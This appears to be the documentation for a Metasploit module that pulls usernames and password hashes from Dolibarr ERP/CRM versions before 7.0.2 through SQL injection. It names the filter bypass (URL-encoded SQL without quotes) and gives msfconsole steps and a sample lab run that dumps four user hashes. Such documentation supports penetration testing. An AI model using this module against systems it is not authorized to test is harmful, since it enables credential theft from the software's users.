## Description

  This module enables an authenticated user to collect usernames and encrypted passwords of other users of the ERP/CRM Dolibarr software via SQL injection.
  Checks in the Dolibarr software can be bypassed by url-encoding the SQL commands, provided that the commands do not contain quotes.

## Vulnerable Application

  Dolibarr ERP/CRM Software versions < v7.0.2. Dolibarr v7.0.0 can be found [here](https://www.exploit-db.com/apps/04b0bb4b4864117b5bf47c0fcc737254-dolibarr-7.0.0.tar.gz).
  By default, user accounts do not have access to view the list of other users of the software. The admin account must first be used to enable the members page, create general users, and give those users permission to access the members page.
  
## Verification Steps

  1. Install the application
  2. Start msfconsole
  3. Do: ```use auxiliary/gather/dolibarr_list_creds_sqli```
  4. Do: ```set RHOSTS [IP]```
  5. Do: ```set USERNAME [USER]```
  6. Do: ```set PASSWORD [PASS]```
  7. Do: ```set TARGETURI [URI]```
  8. Do: ```run```
  9. You should get a list of credentials

## Scenarios

### Tested on Dolibarr v7.0.0 running on Ubuntu 18.04

```

  msf5 > use auxiliary/gather/dolibarr_list_creds_sqli
  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set username test
  username => test
  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set password blah
  password => blah
  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set targeturi /dolibarr
  targeturi => /dolibarr
  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > set rhosts 192.168.37.228
  rhosts => 192.168.37.228
  msf5 auxiliary(gather/dolibarr_list_creds_sqli) > run

  [*] Logging in...
  [+] Successfully logged into Dolibarr
  [+] Accessed credentials
  [+] user 8456167fd64d3cda366bda95088dda4d7ea94995
  [+] test 9d49884ec5f2c8431572a73e3285ceed3f0bdc5b
  [+] blahBlah e345d4aa5a6a63f828870b0d299dd921d119a5c7
  [+] someUser fe79b08f9f6a1104a141ff65047087a36d926f12
  [*] Auxiliary module execution completed

```
